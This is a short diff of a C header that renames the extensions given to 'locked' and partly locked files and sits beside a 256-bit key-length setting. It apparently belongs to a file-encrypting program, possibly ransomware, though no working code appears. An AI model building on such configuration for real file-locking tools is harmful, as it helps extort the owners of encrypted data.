@@ -2,8 +2,8 @@
 /*
 * Extension for all locked files
 */
-#define LOCKED_EXTENSION ".locked"
-#define PART_LOCKED_EXT  ".loked"
+#define LOCKED_EXTENSION ".slm"
+#define PART_LOCKED_EXT  ".slt"
 
 /*
 * Key length in bytes, default is 32 (256 bits)
